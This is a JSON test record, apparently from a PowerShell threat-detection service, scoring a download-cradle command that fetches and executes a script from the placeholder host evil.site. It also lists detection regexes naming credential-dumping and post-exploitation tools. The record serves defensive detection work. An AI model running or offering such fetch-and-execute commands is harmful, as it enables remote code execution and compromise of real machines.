@@ -1,0 +1,194 @@
+{
+  "line_number": 4,
+  "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.site/a.ps1')",
+  "request_payload": {
+    "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.site/a.ps1')"
+  },
+  "status_code": 200,
+  "response": {
+    "success": true,
+    "analysis": {
+      "command": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.site/a.ps1')",
+      "risk_score": 35.5,
+      "severity": "critical",
+      "signatures": [
+        {
+          "name": "Highly suspicious keywords",
+          "severity": "high",
+          "score": 8.2,
+          "base_score": 8.2,
+          "total_score": 8.2,
+          "matches_found": 1,
+          "max_match_allowed": 2,
+          "matches_details": [
+            {
+              "position": {
+                "end": 57,
+                "start": 43
+              },
+              "matched_in": "original",
+              "match_number": 1,
+              "matched_text": "DownloadString"
+            }
+          ],
+          "pattern": "(start|complete)-bitstransfer|mimik|metasp|psrecon|-persistence|AssemblyBuilderAccess|Reflection\\.Assembly|spraying|shellcode|injection|BypassUAC|UACBypass|Rc4ByteStream|System\\.Security\\.Cryptography|\\blsass|LastLoggedOn|hijack|BackupPrivilege|\\bngrok|stage0|comsvcs|backdoor|Microsoft\\.Exchange|brute.?force|Port.?Scan|Exfiltration|exploit|beacon|-dump|SeTcbPrivilege|GPPPassword|CommandAs|\\.kirbi|ntds\\.dit|ntdsutil|krbtgt|esentutl|procdump|(\\b|\\.)amsi|antimalware|Downloadstring|-adgroupmember|StringBuilder|\\bsekurlsa|SimonTatham|\\bksetup\\s|amsiInitFailed|ASCIIEncoding|::ReadAllText|DumpCreds|-decrypt|Schedule\\.Service|e46eead8-0c54-4489-9898-8fa79d059e0e|window\\.location|EtwEventWriteNoRegistration|PasswordVault|ADDefaultDomainPasswordPolicy|TrustedForDelegation|ProtectedData|BeginConnect|\\.SMBOpen|ConsentPromptBehaviorAdmin|Management\\.Automation\\.Host|Port-Scan|LocalAdminAccess|PowerShellWebAccess|BitConverter|PingStatus|set-variable[\\s\\S]+get-variable|clear-history|\\bWinPwn|ComputerDetail|Port.?Scan|nishang|\\[scriptblock\\]|kernel32|e[^a-z0-9]{1,2}n[^a-z0-9]{1,2}c[^a-z0-9]{1,2}o[^a-z0-9]{1,2}d[^a-z0-9]{1,2}e[^a-z0-9]{1,2}d|c[^a-z0-9]{1,2}o[^a-z0-9]{1,2}m[^a-z0-9]{1,2}m[^a-z0-9]{1,2}a[^a-z0-9]{1,2}n[^a-z0-9]{1,2}d|System32[\\\\]+config[\\\\]+(sam|security)|\\-encod\\s|\\S\\.pfx|ReceiveBufferSize|ActiveXObject|Exchange\\.Management\\.PowerShell|System\\.Drawing\\.bitmap|\\.GetPixel|InvokeScript",
+          "tactics": [
+            "TA0002"
+          ],
+          "techniques": [
+            "T1059.001"
+          ],
+          "description": "Detects the presence of multiple high-risk PowerShell keywords and behavioral\nprimitives commonly associated with post-exploitation, credential access,\nlateral movement, defense evasion, and payload staging.\n\nThis indicator aggregates a broad set of strongly suspicious strings into a\nsingle multi-match regex to reduce rule sprawl and maintenance overhead. The\n`maxmatch` parameter limits how many distinct keyword matches are evaluated per\nevent, enabling signal amplification when multiple independent indicators of\nmalicious intent co-occur.\n\nThe regex is intentionally extensive by design. Any individual string or\npattern that requires higher fidelity, different scoring, or independent\ntuning should be promoted to its own dedicated indicator and removed from this\naggregate set.\n\nThis rule was initially inspired by, and later expanded beyond, multiple Sigma\ndetections covering malicious PowerShell tradecraft.",
+          "link": "https://github.com/avasero/psexposed/blob/main/indicators/ps_indicator_highly_suspicious_keywords.yaml",
+          "indicator_type": "community"
+        },
+        {
+          "name": "PowerShell script download",
+          "severity": "high",
+          "score": 7.8,
+          "base_score": 7.8,
+          "total_score": 7.8,
+          "matches_found": 1,
+          "max_match_allowed": 1,
+          "matches_details": [
+            {
+              "position": {
+                "end": 79,
+                "start": 57
+              },
+              "matched_in": "original",
+              "match_number": 1,
+              "matched_text": "http://evil.site/a.ps1"
+            }
+          ],
+          "pattern": "https*://\\S+\\.\\S+/\\S+\\.(ps1|psm1)",
+          "tactics": [
+            "TA0011"
+          ],
+          "techniques": [
+            "T1105"
+          ],
+          "description": "Detects HTTP/HTTPS URLs referencing PowerShell script or module files (.ps1/.psm1), which are commonly used for remote payload delivery and staging.",
+          "link": "https://github.com/avasero/psexposed/blob/main/indicators/ps_indicator_powershell_script_download.yaml",
+          "indicator_type": "community"
+        },
+        {
+          "name": "Web Client traces",
+          "severity": "high",
+          "score": 7.5,
+          "base_score": 7.5,
+          "total_score": 7.5,
+          "matches_found": 1,
+          "max_match_allowed": 1,
+          "matches_details": [
+            {
+              "position": {
+                "end": 42,
+                "start": 32
+              },
+              "matched_in": "original",
+              "match_number": 1,
+              "matched_text": ".WebClient"
+            }
+          ],
+          "pattern": "net\\.http|RestMethod|[\\.-]webclient|WebRequest|Net.Sockets.TcpClient|InternetExplorer\\.Application|(win|Xml)Http|\\b(curl|wget|iwr|irm)\\s+|(InstallProduct\\(|bitstransfer)[\\s\\S]+https*://|\\b[\\u002D\\u2013\\u2014\\u2015](Uri|Url)\\s*https*://",
+          "tactics": [
+            "TA0002"
+          ],
+          "techniques": [
+            "T1105",
+            "T1059.001"
+          ],
+          "description": "Spots potential attempts to use PS as a web client to access network resources. Initially inspired by the Sigma rule in the references.\nNote that the unicodes below refer to Hyphen-Minus (ASCII hyphen), En/m Dash and Horizontal Bar. Refer to FAQ entry 3.1 in the reference to use those in Splunk/SPL.",
+          "link": "https://github.com/avasero/psexposed/blob/main/indicators/ps_indicator_web_client_traces.yaml",
+          "indicator_type": "community"
+        },
+        {
+          "name": "HTTP/S usage",
+          "severity": "high",
+          "score": 7.0,
+          "base_score": 7.0,
+          "total_score": 7.0,
+          "matches_found": 1,
+          "max_match_allowed": 1,
+          "matches_details": [
+            {
+              "position": {
+                "end": 64,
+                "start": 57
+              },
+              "matched_in": "original",
+              "match_number": 1,
+              "matched_text": "http://"
+            }
+          ],
+          "pattern": "(https*)://",
+          "tactics": [
+            "TA0011"
+          ],
+          "techniques": [
+            "T1059.001",
+            "T1071.001"
+          ],
+          "description": "Highlights commands containing a potential URL by matching against an HTTP/S reference. Consider filtering out URLs containing private/known addresses.",
+          "link": "https://github.com/avasero/psexposed/blob/main/indicators/ps_indicator_https_usage.yaml",
+          "indicator_type": "community"
+        },
+        {
+          "name": "Invoke-Expression cmdlet",
+          "severity": "medium",
+          "score": 5.0,
+          "base_score": 5.0,
+          "total_score": 5.0,
+          "matches_found": 1,
+          "max_match_allowed": 1,
+          "matches_details": [
+            {
+              "position": {
+                "end": 17,
+                "start": 0
+              },
+              "matched_in": "original",
+              "match_number": 1,
+              "matched_text": "Invoke-Expression"
+            }
+          ],
+          "pattern": "Invoke-Expression|\\biex\\b",
+          "tactics": [
+            "TA0002"
+          ],
+          "techniques": [
+            "T1059.001"
+          ],
+          "description": "Spots potential use of Invoke-Expression cmdlet and its alias.",
+          "link": "https://github.com/avasero/psexposed/blob/main/indicators/ps_indicator_invoke_expression_cmdlet.yaml",
+          "indicator_type": "community"
+        }
+      ],
+      "tactics": [
+        "TA0002",
+        "TA0011"
+      ],
+      "techniques": [
+        "T1105",
+        "T1059.001",
+        "T1071.001"
+      ],
+      "decoded_command": null,
+      "double_decoded_command": null
+    },
+    "analysis_id": "q5shi6tq",
+    "session_id": "3013961b-7bc7-406a-b3b3-ac58d7c41351",
+    "decode_info": {
+      "current_usage": 3,
+      "limit": 5,
+      "is_example": false,
+      "decode_used_this_request": false
+    },
+    "rate_limit_info": {
+      "within_limit": true,
+      "current_count": 3,
+      "limit": 10
+    }
+  }
+}
